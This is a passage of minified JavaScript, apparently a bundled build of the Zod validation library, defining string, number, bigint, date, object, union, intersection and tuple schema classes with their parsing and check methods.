            status: r.value,
            value: t.data
        }
    }
    _regex(t, n, r) {
        return this.refinement(o => t.test(o), {
            validation: n,
            code: I.invalid_string,
            ...G.errToObj(r)
        })
    }
    _addCheck(t) {
        return new ln({
            ...this._def,
            checks: [...this._def.checks, t]
        })
    }
    email(t) {
        return this._addCheck({
            kind: "email",
            ...G.errToObj(t)
        })
    }
    url(t) {
        return this._addCheck({
            kind: "url",
            ...G.errToObj(t)
        })
    }
    emoji(t) {
        return this._addCheck({
            kind: "emoji",
            ...G.errToObj(t)
        })
    }
    uuid(t) {
        return this._addCheck({
            kind: "uuid",
            ...G.errToObj(t)
        })
    }
    nanoid(t) {
        return this._addCheck({
            kind: "nanoid",
            ...G.errToObj(t)
        })
    }
    cuid(t) {
        return this._addCheck({
            kind: "cuid",
            ...G.errToObj(t)
        })
    }
    cuid2(t) {
        return this._addCheck({
            kind: "cuid2",
            ...G.errToObj(t)
        })
    }
    ulid(t) {
        return this._addCheck({
            kind: "ulid",
            ...G.errToObj(t)
        })
    }
    base64(t) {
        return this._addCheck({
            kind: "base64",
            ...G.errToObj(t)
        })
    }
    ip(t) {
        return this._addCheck({
            kind: "ip",
            ...G.errToObj(t)
        })
    }
    datetime(t) {
        var n, r;
        return typeof t == "string" ? this._addCheck({
            kind: "datetime",
            precision: null,
            offset: !1,
            local: !1,
            message: t
        }) : this._addCheck({
            kind: "datetime",
            precision: typeof (t == null ? void 0 : t.precision) > "u" ? null : t == null ? void 0 : t.precision,
            offset: (n = t == null ? void 0 : t.offset) !== null && n !== void 0 ? n : !1,
            local: (r = t == null ? void 0 : t.local) !== null && r !== void 0 ? r : !1,
            ...G.errToObj(t == null ? void 0 : t.message)
        })
    }
    date(t) {
        return this._addCheck({
            kind: "date",
            message: t
        })
    }
    time(t) {
        return typeof t == "string" ? this._addCheck({
            kind: "time",
            precision: null,
            message: t
        }) : this._addCheck({
            kind: "time",
            precision: typeof (t == null ? void 0 : t.precision) > "u" ? null : t == null ? void 0 : t.precision,
            ...G.errToObj(t == null ? void 0 : t.message)
        })
    }
    duration(t) {
        return this._addCheck({
            kind: "duration",
            ...G.errToObj(t)
        })
    }
    regex(t, n) {
        return this._addCheck({
            kind: "regex",
            regex: t,
            ...G.errToObj(n)
        })
    }
    includes(t, n) {
        return this._addCheck({
            kind: "includes",
            value: t,
            position: n == null ? void 0 : n.position,
            ...G.errToObj(n == null ? void 0 : n.message)
        })
    }
    startsWith(t, n) {
        return this._addCheck({
            kind: "startsWith",
            value: t,
            ...G.errToObj(n)
        })
    }
    endsWith(t, n) {
        return this._addCheck({
            kind: "endsWith",
            value: t,
            ...G.errToObj(n)
        })
    }
    min(t, n) {
        return this._addCheck({
            kind: "min",
            value: t,
            ...G.errToObj(n)
        })
    }
    max(t, n) {
        return this._addCheck({
            kind: "max",
            value: t,
            ...G.errToObj(n)
        })
    }
    length(t, n) {
        return this._addCheck({
            kind: "length",
            value: t,
            ...G.errToObj(n)
        })
    }
    nonempty(t) {
        return this.min(1, G.errToObj(t))
    }
    trim() {
        return new ln({
            ...this._def,
            checks: [...this._def.checks, {
                kind: "trim"
            }]
        })
    }
    toLowerCase() {
        return new ln({
            ...this._def,
            checks: [...this._def.checks, {
                kind: "toLowerCase"
            }]
        })
    }
    toUpperCase() {
        return new ln({
            ...this._def,
            checks: [...this._def.checks, {
                kind: "toUpperCase"
            }]
        })
    }
    get isDatetime() {
        return !!this._def.checks.find(t => t.kind === "datetime")
    }
    get isDate() {
        return !!this._def.checks.find(t => t.kind === "date")
    }
    get isTime() {
        return !!this._def.checks.find(t => t.kind === "time")
    }
    get isDuration() {
        return !!this._def.checks.find(t => t.kind === "duration")
    }
    get isEmail() {
        return !!this._def.checks.find(t => t.kind === "email")
    }
    get isURL() {
        return !!this._def.checks.find(t => t.kind === "url")
    }
    get isEmoji() {
        return !!this._def.checks.find(t => t.kind === "emoji")
    }
    get isUUID() {
        return !!this._def.checks.find(t => t.kind === "uuid")
    }
    get isNANOID() {
        return !!this._def.checks.find(t => t.kind === "nanoid")
    }
    get isCUID() {
        return !!this._def.checks.find(t => t.kind === "cuid")
    }
    get isCUID2() {
        return !!this._def.checks.find(t => t.kind === "cuid2")
    }
    get isULID() {
        return !!this._def.checks.find(t => t.kind === "ulid")
    }
    get isIP() {
        return !!this._def.checks.find(t => t.kind === "ip")
    }
    get isBase64() {
        return !!this._def.checks.find(t => t.kind === "base64")
    }
    get minLength() {
        let t = null;
        for (const n of this._def.checks)
            n.kind === "min" && (t === null || n.value > t) && (t = n.value);
        return t
    }
    get maxLength() {
        let t = null;
        for (const n of this._def.checks)
            n.kind === "max" && (t === null || n.value < t) && (t = n.value);
        return t
    }
}
ln.create = e => {
    var t;
    return new ln({
        checks: [],
        typeName: te.ZodString,
        coerce: (t = e == null ? void 0 : e.coerce) !== null && t !== void 0 ? t : !1,
        ...ae(e)
    })
}
;
function Yk(e, t) {
    const n = (e.toString().split(".")[1] || "").length
      , r = (t.toString().split(".")[1] || "").length
      , o = n > r ? n : r
      , s = parseInt(e.toFixed(o).replace(".", ""))
      , i = parseInt(t.toFixed(o).replace(".", ""));
    return s % i / Math.pow(10, o)
}
class Pr extends ue {
    constructor() {
        super(...arguments),
        this.min = this.gte,
        this.max = this.lte,
        this.step = this.multipleOf
    }
    _parse(t) {
        if (this._def.coerce && (t.data = Number(t.data)),
        this._getType(t) !== W.number) {
            const s = this._getOrReturnCtx(t);
            return B(s, {
                code: I.invalid_type,
                expected: W.number,
                received: s.parsedType
            }),
            ne
        }
        let r;
        const o = new pt;
        for (const s of this._def.checks)
            s.kind === "int" ? pe.isInteger(t.data) || (r = this._getOrReturnCtx(t, r),
            B(r, {
                code: I.invalid_type,
                expected: "integer",
                received: "float",
                message: s.message
            }),
            o.dirty()) : s.kind === "min" ? (s.inclusive ? t.data < s.value : t.data <= s.value) && (r = this._getOrReturnCtx(t, r),
            B(r, {
                code: I.too_small,
                minimum: s.value,
                type: "number",
                inclusive: s.inclusive,
                exact: !1,
                message: s.message
            }),
            o.dirty()) : s.kind === "max" ? (s.inclusive ? t.data > s.value : t.data >= s.value) && (r = this._getOrReturnCtx(t, r),
            B(r, {
                code: I.too_big,
                maximum: s.value,
                type: "number",
                inclusive: s.inclusive,
                exact: !1,
                message: s.message
            }),
            o.dirty()) : s.kind === "multipleOf" ? Yk(t.data, s.value) !== 0 && (r = this._getOrReturnCtx(t, r),
            B(r, {
                code: I.not_multiple_of,
                multipleOf: s.value,
                message: s.message
            }),
            o.dirty()) : s.kind === "finite" ? Number.isFinite(t.data) || (r = this._getOrReturnCtx(t, r),
            B(r, {
                code: I.not_finite,
                message: s.message
            }),
            o.dirty()) : pe.assertNever(s);
        return {
            status: o.value,
            value: t.data
        }
    }
    gte(t, n) {
        return this.setLimit("min", t, !0, G.toString(n))
    }
    gt(t, n) {
        return this.setLimit("min", t, !1, G.toString(n))
    }
    lte(t, n) {
        return this.setLimit("max", t, !0, G.toString(n))
    }
    lt(t, n) {
        return this.setLimit("max", t, !1, G.toString(n))
    }
    setLimit(t, n, r, o) {
        return new Pr({
            ...this._def,
            checks: [...this._def.checks, {
                kind: t,
                value: n,
                inclusive: r,
                message: G.toString(o)
            }]
        })
    }
    _addCheck(t) {
        return new Pr({
            ...this._def,
            checks: [...this._def.checks, t]
        })
    }
    int(t) {
        return this._addCheck({
            kind: "int",
            message: G.toString(t)
        })
    }
    positive(t) {
        return this._addCheck({
            kind: "min",
            value: 0,
            inclusive: !1,
            message: G.toString(t)
        })
    }
    negative(t) {
        return this._addCheck({
            kind: "max",
            value: 0,
            inclusive: !1,
            message: G.toString(t)
        })
    }
    nonpositive(t) {
        return this._addCheck({
            kind: "max",
            value: 0,
            inclusive: !0,
            message: G.toString(t)
        })
    }
    nonnegative(t) {
        return this._addCheck({
            kind: "min",
            value: 0,
            inclusive: !0,
            message: G.toString(t)
        })
    }
    multipleOf(t, n) {
        return this._addCheck({
            kind: "multipleOf",
            value: t,
            message: G.toString(n)
        })
    }
    finite(t) {
        return this._addCheck({
            kind: "finite",
            message: G.toString(t)
        })
    }
    safe(t) {
        return this._addCheck({
            kind: "min",
            inclusive: !0,
            value: Number.MIN_SAFE_INTEGER,
            message: G.toString(t)
        })._addCheck({
            kind: "max",
            inclusive: !0,
            value: Number.MAX_SAFE_INTEGER,
            message: G.toString(t)
        })
    }
    get minValue() {
        let t = null;
        for (const n of this._def.checks)
            n.kind === "min" && (t === null || n.value > t) && (t = n.value);
        return t
    }
    get maxValue() {
        let t = null;
        for (const n of this._def.checks)
            n.kind === "max" && (t === null || n.value < t) && (t = n.value);
        return t
    }
    get isInt() {
        return !!this._def.checks.find(t => t.kind === "int" || t.kind === "multipleOf" && pe.isInteger(t.value))
    }
    get isFinite() {
        let t = null
          , n = null;
        for (const r of this._def.checks) {
            if (r.kind === "finite" || r.kind === "int" || r.kind === "multipleOf")
                return !0;
            r.kind === "min" ? (n === null || r.value > n) && (n = r.value) : r.kind === "max" && (t === null || r.value < t) && (t = r.value)
        }
        return Number.isFinite(n) && Number.isFinite(t)
    }
}
Pr.create = e => new Pr({
    checks: [],
    typeName: te.ZodNumber,
    coerce: (e == null ? void 0 : e.coerce) || !1,
    ...ae(e)
});
class Nr extends ue {
    constructor() {
        super(...arguments),
        this.min = this.gte,
        this.max = this.lte
    }
    _parse(t) {
        if (this._def.coerce && (t.data = BigInt(t.data)),
        this._getType(t) !== W.bigint) {
            const s = this._getOrReturnCtx(t);
            return B(s, {
                code: I.invalid_type,
                expected: W.bigint,
                received: s.parsedType
            }),
            ne
        }
        let r;
        const o = new pt;
        for (const s of this._def.checks)
            s.kind === "min" ? (s.inclusive ? t.data < s.value : t.data <= s.value) && (r = this._getOrReturnCtx(t, r),
            B(r, {
                code: I.too_small,
                type: "bigint",
                minimum: s.value,
                inclusive: s.inclusive,
                message: s.message
            }),
            o.dirty()) : s.kind === "max" ? (s.inclusive ? t.data > s.value : t.data >= s.value) && (r = this._getOrReturnCtx(t, r),
            B(r, {
                code: I.too_big,
                type: "bigint",
                maximum: s.value,
                inclusive: s.inclusive,
                message: s.message
            }),
            o.dirty()) : s.kind === "multipleOf" ? t.data % s.value !== BigInt(0) && (r = this._getOrReturnCtx(t, r),
            B(r, {
                code: I.not_multiple_of,
                multipleOf: s.value,
                message: s.message
            }),
            o.dirty()) : pe.assertNever(s);
        return {
            status: o.value,
            value: t.data
        }
    }
    gte(t, n) {
        return this.setLimit("min", t, !0, G.toString(n))
    }
    gt(t, n) {
        return this.setLimit("min", t, !1, G.toString(n))
    }
    lte(t, n) {
        return this.setLimit("max", t, !0, G.toString(n))
    }
    lt(t, n) {
        return this.setLimit("max", t, !1, G.toString(n))
    }
    setLimit(t, n, r, o) {
        return new Nr({
            ...this._def,
            checks: [...this._def.checks, {
                kind: t,
                value: n,
                inclusive: r,
                message: G.toString(o)
            }]
        })
    }
    _addCheck(t) {
        return new Nr({
            ...this._def,
            checks: [...this._def.checks, t]
        })
    }
    positive(t) {
        return this._addCheck({
            kind: "min",
            value: BigInt(0),
            inclusive: !1,
            message: G.toString(t)
        })
    }
    negative(t) {
        return this._addCheck({
            kind: "max",
            value: BigInt(0),
            inclusive: !1,
            message: G.toString(t)
        })
    }
    nonpositive(t) {
        return this._addCheck({
            kind: "max",
            value: BigInt(0),
            inclusive: !0,
            message: G.toString(t)
        })
    }
    nonnegative(t) {
        return this._addCheck({
            kind: "min",
            value: BigInt(0),
            inclusive: !0,
            message: G.toString(t)
        })
    }
    multipleOf(t, n) {
        return this._addCheck({
            kind: "multipleOf",
            value: t,
            message: G.toString(n)
        })
    }
    get minValue() {
        let t = null;
        for (const n of this._def.checks)
            n.kind === "min" && (t === null || n.value > t) && (t = n.value);
        return t
    }
    get maxValue() {
        let t = null;
        for (const n of this._def.checks)
            n.kind === "max" && (t === null || n.value < t) && (t = n.value);
        return t
    }
}
Nr.create = e => {
    var t;
    return new Nr({
        checks: [],
        typeName: te.ZodBigInt,
        coerce: (t = e == null ? void 0 : e.coerce) !== null && t !== void 0 ? t : !1,
        ...ae(e)
    })
}
;
class Mi extends ue {
    _parse(t) {
        if (this._def.coerce && (t.data = !!t.data),
        this._getType(t) !== W.boolean) {
            const r = this._getOrReturnCtx(t);
            return B(r, {
                code: I.invalid_type,
                expected: W.boolean,
                received: r.parsedType
            }),
            ne
        }
        return wt(t.data)
    }
}
Mi.create = e => new Mi({
    typeName: te.ZodBoolean,
    coerce: (e == null ? void 0 : e.coerce) || !1,
    ...ae(e)
});
class ao extends ue {
    _parse(t) {
        if (this._def.coerce && (t.data = new Date(t.data)),
        this._getType(t) !== W.date) {
            const s = this._getOrReturnCtx(t);
            return B(s, {
                code: I.invalid_type,
                expected: W.date,
                received: s.parsedType
            }),
            ne
        }
        if (isNaN(t.data.getTime())) {
            const s = this._getOrReturnCtx(t);
            return B(s, {
                code: I.invalid_date
            }),
            ne
        }
        const r = new pt;
        let o;
        for (const s of this._def.checks)
            s.kind === "min" ? t.data.getTime() < s.value && (o = this._getOrReturnCtx(t, o),
            B(o, {
                code: I.too_small,
                message: s.message,
                inclusive: !0,
                exact: !1,
                minimum: s.value,
                type: "date"
            }),
            r.dirty()) : s.kind === "max" ? t.data.getTime() > s.value && (o = this._getOrReturnCtx(t, o),
            B(o, {
                code: I.too_big,
                message: s.message,
                inclusive: !0,
                exact: !1,
                maximum: s.value,
                type: "date"
            }),
            r.dirty()) : pe.assertNever(s);
        return {
            status: r.value,
            value: new Date(t.data.getTime())
        }
    }
    _addCheck(t) {
        return new ao({
            ...this._def,
            checks: [...this._def.checks, t]
        })
    }
    min(t, n) {
        return this._addCheck({
            kind: "min",
            value: t.getTime(),
            message: G.toString(n)
        })
    }
    max(t, n) {
        return this._addCheck({
            kind: "max",
            value: t.getTime(),
            message: G.toString(n)
        })
    }
    get minDate() {
        let t = null;
        for (const n of this._def.checks)
            n.kind === "min" && (t === null || n.value > t) && (t = n.value);
        return t != null ? new Date(t) : null
    }
    get maxDate() {
        let t = null;
        for (const n of this._def.checks)
            n.kind === "max" && (t === null || n.value < t) && (t = n.value);
        return t != null ? new Date(t) : null
    }
}
ao.create = e => new ao({
    checks: [],
    coerce: (e == null ? void 0 : e.coerce) || !1,
    typeName: te.ZodDate,
    ...ae(e)
});
class Ml extends ue {
    _parse(t) {
        if (this._getType(t) !== W.symbol) {
            const r = this._getOrReturnCtx(t);
            return B(r, {
                code: I.invalid_type,
                expected: W.symbol,
                received: r.parsedType
            }),
            ne
        }
        return wt(t.data)
    }
}
Ml.create = e => new Ml({
    typeName: te.ZodSymbol,
    ...ae(e)
});
class Ii extends ue {
    _parse(t) {
        if (this._getType(t) !== W.undefined) {
            const r = this._getOrReturnCtx(t);
            return B(r, {
                code: I.invalid_type,
                expected: W.undefined,
                received: r.parsedType
            }),
            ne
        }
        return wt(t.data)
    }
}
Ii.create = e => new Ii({
    typeName: te.ZodUndefined,
    ...ae(e)
});
class Li extends ue {
    _parse(t) {
        if (this._getType(t) !== W.null) {
            const r = this._getOrReturnCtx(t);
            return B(r, {
                code: I.invalid_type,
                expected: W.null,
                received: r.parsedType
            }),
            ne
        }
        return wt(t.data)
    }
}
Li.create = e => new Li({
    typeName: te.ZodNull,
    ...ae(e)
});
class ms extends ue {
    constructor() {
        super(...arguments),
        this._any = !0
    }
    _parse(t) {
        return wt(t.data)
    }
}
ms.create = e => new ms({
    typeName: te.ZodAny,
    ...ae(e)
});
class to extends ue {
    constructor() {
        super(...arguments),
        this._unknown = !0
    }
    _parse(t) {
        return wt(t.data)
    }
}
to.create = e => new to({
    typeName: te.ZodUnknown,
    ...ae(e)
});
class qn extends ue {
    _parse(t) {
        const n = this._getOrReturnCtx(t);
        return B(n, {
            code: I.invalid_type,
            expected: W.never,
            received: n.parsedType
        }),
        ne
    }
}
qn.create = e => new qn({
    typeName: te.ZodNever,
    ...ae(e)
});
class Il extends ue {
    _parse(t) {
        if (this._getType(t) !== W.undefined) {
            const r = this._getOrReturnCtx(t);
            return B(r, {
                code: I.invalid_type,
                expected: W.void,
                received: r.parsedType
            }),
            ne
        }
        return wt(t.data)
    }
}
Il.create = e => new Il({
    typeName: te.ZodVoid,
    ...ae(e)
});
class dn extends ue {
    _parse(t) {
        const {ctx: n, status: r} = this._processInputParams(t)
          , o = this._def;
        if (n.parsedType !== W.array)
            return B(n, {
                code: I.invalid_type,
                expected: W.array,
                received: n.parsedType
            }),
            ne;
        if (o.exactLength !== null) {
            const i = n.data.length > o.exactLength.value
              , a = n.data.length < o.exactLength.value;
            (i || a) && (B(n, {
                code: i ? I.too_big : I.too_small,
                minimum: a ? o.exactLength.value : void 0,
                maximum: i ? o.exactLength.value : void 0,
                type: "array",
                inclusive: !0,
                exact: !0,
                message: o.exactLength.message
            }),
            r.dirty())
        }
        if (o.minLength !== null && n.data.length < o.minLength.value && (B(n, {
            code: I.too_small,
            minimum: o.minLength.value,
            type: "array",
            inclusive: !0,
            exact: !1,
            message: o.minLength.message
        }),
        r.dirty()),
        o.maxLength !== null && n.data.length > o.maxLength.value && (B(n, {
            code: I.too_big,
            maximum: o.maxLength.value,
            type: "array",
            inclusive: !0,
            exact: !1,
            message: o.maxLength.message
        }),
        r.dirty()),
        n.common.async)
            return Promise.all([...n.data].map( (i, a) => o.type._parseAsync(new Nn(n,i,n.path,a)))).then(i => pt.mergeArray(r, i));
        const s = [...n.data].map( (i, a) => o.type._parseSync(new Nn(n,i,n.path,a)));
        return pt.mergeArray(r, s)
    }
    get element() {
        return this._def.type
    }
    min(t, n) {
        return new dn({
            ...this._def,
            minLength: {
                value: t,
                message: G.toString(n)
            }
        })
    }
    max(t, n) {
        return new dn({
            ...this._def,
            maxLength: {
                value: t,
                message: G.toString(n)
            }
        })
    }
    length(t, n) {
        return new dn({
            ...this._def,
            exactLength: {
                value: t,
                message: G.toString(n)
            }
        })
    }
    nonempty(t) {
        return this.min(1, t)
    }
}
dn.create = (e, t) => new dn({
    type: e,
    minLength: null,
    maxLength: null,
    exactLength: null,
    typeName: te.ZodArray,
    ...ae(t)
});
function Co(e) {
    if (e instanceof Oe) {
        const t = {};
        for (const n in e.shape) {
            const r = e.shape[n];
            t[n] = Tn.create(Co(r))
        }
        return new Oe({
            ...e._def,
            shape: () => t
        })
    } else
        return e instanceof dn ? new dn({
            ...e._def,
            type: Co(e.element)
        }) : e instanceof Tn ? Tn.create(Co(e.unwrap())) : e instanceof Ar ? Ar.create(Co(e.unwrap())) : e instanceof Rn ? Rn.create(e.items.map(t => Co(t))) : e
}
class Oe extends ue {
    constructor() {
        super(...arguments),
        this._cached = null,
        this.nonstrict = this.passthrough,
        this.augment = this.extend
    }
    _getCached() {
        if (this._cached !== null)
            return this._cached;
        const t = this._def.shape()
          , n = pe.objectKeys(t);
        return this._cached = {
            shape: t,
            keys: n
        }
    }
    _parse(t) {
        if (this._getType(t) !== W.object) {
            const u = this._getOrReturnCtx(t);
            return B(u, {
                code: I.invalid_type,
                expected: W.object,
                received: u.parsedType
            }),
            ne
        }
        const {status: r, ctx: o} = this._processInputParams(t)
          , {shape: s, keys: i} = this._getCached()
          , a = [];
        if (!(this._def.catchall instanceof qn && this._def.unknownKeys === "strip"))
            for (const u in o.data)
                i.includes(u) || a.push(u);
        const l = [];
        for (const u of i) {
            const c = s[u]
              , d = o.data[u];
            l.push({
                key: {
                    status: "valid",
                    value: u
                },
                value: c._parse(new Nn(o,d,o.path,u)),
                alwaysSet: u in o.data
            })
        }
        if (this._def.catchall instanceof qn) {
            const u = this._def.unknownKeys;
            if (u === "passthrough")
                for (const c of a)
                    l.push({
                        key: {
                            status: "valid",
                            value: c
                        },
                        value: {
                            status: "valid",
                            value: o.data[c]
                        }
                    });
            else if (u === "strict")
                a.length > 0 && (B(o, {
                    code: I.unrecognized_keys,
                    keys: a
                }),
                r.dirty());
            else if (u !== "strip")
                throw new Error("Internal ZodObject error: invalid unknownKeys value.")
        } else {
            const u = this._def.catchall;
            for (const c of a) {
                const d = o.data[c];
                l.push({
                    key: {
                        status: "valid",
                        value: c
                    },
                    value: u._parse(new Nn(o,d,o.path,c)),
                    alwaysSet: c in o.data
                })
            }
        }
        return o.common.async ? Promise.resolve().then(async () => {
            const u = [];
            for (const c of l) {
                const d = await c.key
                  , p = await c.value;
                u.push({
                    key: d,
                    value: p,
                    alwaysSet: c.alwaysSet
                })
            }
            return u
        }
        ).then(u => pt.mergeObjectSync(r, u)) : pt.mergeObjectSync(r, l)
    }
    get shape() {
        return this._def.shape()
    }
    strict(t) {
        return G.errToObj,
        new Oe({
            ...this._def,
            unknownKeys: "strict",
            ...t !== void 0 ? {
                errorMap: (n, r) => {
                    var o, s, i, a;
                    const l = (i = (s = (o = this._def).errorMap) === null || s === void 0 ? void 0 : s.call(o, n, r).message) !== null && i !== void 0 ? i : r.defaultError;
                    return n.code === "unrecognized_keys" ? {
                        message: (a = G.errToObj(t).message) !== null && a !== void 0 ? a : l
                    } : {
                        message: l
                    }
                }
            } : {}
        })
    }
    strip() {
        return new Oe({
            ...this._def,
            unknownKeys: "strip"
        })
    }
    passthrough() {
        return new Oe({
            ...this._def,
            unknownKeys: "passthrough"
        })
    }
    extend(t) {
        return new Oe({
            ...this._def,
            shape: () => ({
                ...this._def.shape(),
                ...t
            })
        })
    }
    merge(t) {
        return new Oe({
            unknownKeys: t._def.unknownKeys,
            catchall: t._def.catchall,
            shape: () => ({
                ...this._def.shape(),
                ...t._def.shape()
            }),
            typeName: te.ZodObject
        })
    }
    setKey(t, n) {
        return this.augment({
            [t]: n
        })
    }
    catchall(t) {
        return new Oe({
            ...this._def,
            catchall: t
        })
    }
    pick(t) {
        const n = {};
        return pe.objectKeys(t).forEach(r => {
            t[r] && this.shape[r] && (n[r] = this.shape[r])
        }
        ),
        new Oe({
            ...this._def,
            shape: () => n
        })
    }
    omit(t) {
        const n = {};
        return pe.objectKeys(this.shape).forEach(r => {
            t[r] || (n[r] = this.shape[r])
        }
        ),
        new Oe({
            ...this._def,
            shape: () => n
        })
    }
    deepPartial() {
        return Co(this)
    }
    partial(t) {
        const n = {};
        return pe.objectKeys(this.shape).forEach(r => {
            const o = this.shape[r];
            t && !t[r] ? n[r] = o : n[r] = o.optional()
        }
        ),
        new Oe({
            ...this._def,
            shape: () => n
        })
    }
    required(t) {
        const n = {};
        return pe.objectKeys(this.shape).forEach(r => {
            if (t && !t[r])
                n[r] = this.shape[r];
            else {
                let s = this.shape[r];
                for (; s instanceof Tn; )
                    s = s._def.innerType;
                n[r] = s
            }
        }
        ),
        new Oe({
            ...this._def,
            shape: () => n
        })
    }
    keyof() {
        return Bw(pe.objectKeys(this.shape))
    }
}
Oe.create = (e, t) => new Oe({
    shape: () => e,
    unknownKeys: "strip",
    catchall: qn.create(),
    typeName: te.ZodObject,
    ...ae(t)
});
Oe.strictCreate = (e, t) => new Oe({
    shape: () => e,
    unknownKeys: "strict",
    catchall: qn.create(),
    typeName: te.ZodObject,
    ...ae(t)
});
Oe.lazycreate = (e, t) => new Oe({
    shape: e,
    unknownKeys: "strip",
    catchall: qn.create(),
    typeName: te.ZodObject,
    ...ae(t)
});
class Di extends ue {
    _parse(t) {
        const {ctx: n} = this._processInputParams(t)
          , r = this._def.options;
        function o(s) {
            for (const a of s)
                if (a.result.status === "valid")
                    return a.result;
            for (const a of s)
                if (a.result.status === "dirty")
                    return n.common.issues.push(...a.ctx.common.issues),
                    a.result;
            const i = s.map(a => new It(a.ctx.common.issues));
            return B(n, {
                code: I.invalid_union,
                unionErrors: i
            }),
            ne
        }
        if (n.common.async)
            return Promise.all(r.map(async s => {
                const i = {
                    ...n,
                    common: {
                        ...n.common,
                        issues: []
                    },
                    parent: null
                };
                return {
                    result: await s._parseAsync({
                        data: n.data,
                        path: n.path,
                        parent: i
                    }),
                    ctx: i
                }
            }
            )).then(o);
        {
            let s;
            const i = [];
            for (const l of r) {
                const u = {
                    ...n,
                    common: {
                        ...n.common,
                        issues: []
                    },
                    parent: null
                }
                  , c = l._parseSync({
                    data: n.data,
                    path: n.path,
                    parent: u
                });
                if (c.status === "valid")
                    return c;
                c.status === "dirty" && !s && (s = {
                    result: c,
                    ctx: u
                }),
                u.common.issues.length && i.push(u.common.issues)
            }
            if (s)
                return n.common.issues.push(...s.ctx.common.issues),
                s.result;
            const a = i.map(l => new It(l));
            return B(n, {
                code: I.invalid_union,
                unionErrors: a
            }),
            ne
        }
    }
    get options() {
        return this._def.options
    }
}
Di.create = (e, t) => new Di({
    options: e,
    typeName: te.ZodUnion,
    ...ae(t)
});
const Dn = e => e instanceof zi ? Dn(e.schema) : e instanceof pn ? Dn(e.innerType()) : e instanceof $i ? [e.value] : e instanceof Rr ? e.options : e instanceof Ui ? pe.objectValues(e.enum) : e instanceof Bi ? Dn(e._def.innerType) : e instanceof Ii ? [void 0] : e instanceof Li ? [null] : e instanceof Tn ? [void 0, ...Dn(e.unwrap())] : e instanceof Ar ? [null, ...Dn(e.unwrap())] : e instanceof Gf || e instanceof Wi ? Dn(e.unwrap()) : e instanceof Hi ? Dn(e._def.innerType) : [];
class gu extends ue {
    _parse(t) {
        const {ctx: n} = this._processInputParams(t);
        if (n.parsedType !== W.object)
            return B(n, {
                code: I.invalid_type,
                expected: W.object,
                received: n.parsedType
            }),
            ne;
        const r = this.discriminator
          , o = n.data[r]
          , s = this.optionsMap.get(o);
        return s ? n.common.async ? s._parseAsync({
            data: n.data,
            path: n.path,
            parent: n
        }) : s._parseSync({
            data: n.data,
            path: n.path,
            parent: n
        }) : (B(n, {
            code: I.invalid_union_discriminator,
            options: Array.from(this.optionsMap.keys()),
            path: [r]
        }),
        ne)
    }
    get discriminator() {
        return this._def.discriminator
    }
    get options() {
        return this._def.options
    }
    get optionsMap() {
        return this._def.optionsMap
    }
    static create(t, n, r) {
        const o = new Map;
        for (const s of n) {
            const i = Dn(s.shape[t]);
            if (!i.length)
                throw new Error(`A discriminator value for key \`${t}\` could not be extracted from all schema options`);
            for (const a of i) {
                if (o.has(a))
                    throw new Error(`Discriminator property ${String(t)} has duplicate value ${String(a)}`);
                o.set(a, s)
            }
        }
        return new gu({
            typeName: te.ZodDiscriminatedUnion,
            discriminator: t,
            options: n,
            optionsMap: o,
            ...ae(r)
        })
    }
}
function Td(e, t) {
    const n = ur(e)
      , r = ur(t);
    if (e === t)
        return {
            valid: !0,
            data: e
        };
    if (n === W.object && r === W.object) {
        const o = pe.objectKeys(t)
          , s = pe.objectKeys(e).filter(a => o.indexOf(a) !== -1)
          , i = {
            ...e,
            ...t
        };
        for (const a of s) {
            const l = Td(e[a], t[a]);
            if (!l.valid)
                return {
                    valid: !1
                };
            i[a] = l.data
        }
        return {
            valid: !0,
            data: i
        }
    } else if (n === W.array && r === W.array) {
        if (e.length !== t.length)
            return {
                valid: !1
            };
        const o = [];
        for (let s = 0; s < e.length; s++) {
            const i = e[s]
              , a = t[s]
              , l = Td(i, a);
            if (!l.valid)
                return {
                    valid: !1
                };
            o.push(l.data)
        }
        return {
            valid: !0,
            data: o
        }
    } else
        return n === W.date && r === W.date && +e == +t ? {
            valid: !0,
            data: e
        } : {
            valid: !1
        }
}
class Fi extends ue {
    _parse(t) {
        const {status: n, ctx: r} = this._processInputParams(t)
          , o = (s, i) => {
            if (Cd(s) || Cd(i))
                return ne;
            const a = Td(s.value, i.value);
            return a.valid ? ((kd(s) || kd(i)) && n.dirty(),
            {
                status: n.value,
                value: a.data
            }) : (B(r, {
                code: I.invalid_intersection_types
            }),
            ne)
        }
        ;
        return r.common.async ? Promise.all([this._def.left._parseAsync({
            data: r.data,
            path: r.path,
            parent: r
        }), this._def.right._parseAsync({
            data: r.data,
            path: r.path,
            parent: r
        })]).then( ([s,i]) => o(s, i)) : o(this._def.left._parseSync({
            data: r.data,
            path: r.path,
            parent: r
        }), this._def.right._parseSync({
            data: r.data,
            path: r.path,
            parent: r
        }))
    }
}
Fi.create = (e, t, n) => new Fi({
    left: e,
    right: t,
    typeName: te.ZodIntersection,
    ...ae(n)
});
class Rn extends ue {
    _parse(t) {
        const {status: n, ctx: r} = this._processInputParams(t);
        if (r.parsedType !== W.array)
            return B(r, {
                code: I.invalid_type,
                expected: W.array,
                received: r.parsedType
            }),
            ne;
        if (r.data.length < this._def.items.length)
            return B(r, {
                code: I.too_small,
                minimum: this._def.items.length,
                inclusive: !0,
                exact: !1,
                type: "array"
            }),
            ne;
        !this._def.rest && r.data.length > this._def.items.length && (B(r, {
            code: I.too_big,
            maximum: this._def.items.length,
            inclusive: !0,
            exact: !1,
            type: "array"
        }),
        n.dirty());
        const s = [...r.data].map( (i, a) => {
            const l = this._def.items[a] || this._def.rest;
            return l ? l._parse(new Nn(r,i,r.path,a)) : null
        }
        ).filter(i => !!i);
        return r.common.async ? Promise.all(s).then(i => pt.mergeArray(n, i)) : pt.mergeArray(n, s)
    }
    get items() {
        return this._def.items
    }
    rest(t) {
        return new Rn({
            ...this._def,
            rest: t
        })
    }
}
Rn.create = (e, t) => {
    if (!Array.isArray(e))
        throw new Error("You must pass an array of schemas to z.tuple([ ... ])");
    return new Rn({
        items: e,
        typeName: te.ZodTuple,
        rest: null,
        ...ae(t)
    })
}
;
class Vi extends ue {
    get keySchema() {
        return this._def.keyType
    }
    get valueSchema() {
        return this._def.valueType
    }
    _parse(t) {
        const {status: n, ctx: r} = this._processInputParams(t);
        if (r.parsedType !== W.object)
            return B(r, {
                code: I.invalid_type,
                expected: W.object,
                received: r.parsedType
            }),
            ne;
        const o = []
          , s = this._def.keyType
          , i = this._def.valueType;
        for (const a in r.data)
            o.push({
                key: s._parse(new Nn(r,a,r.path,a)),
                value: i._parse(new Nn(r,r.data[a],r.path,a)),
                alwaysSet: a in r.data
            });
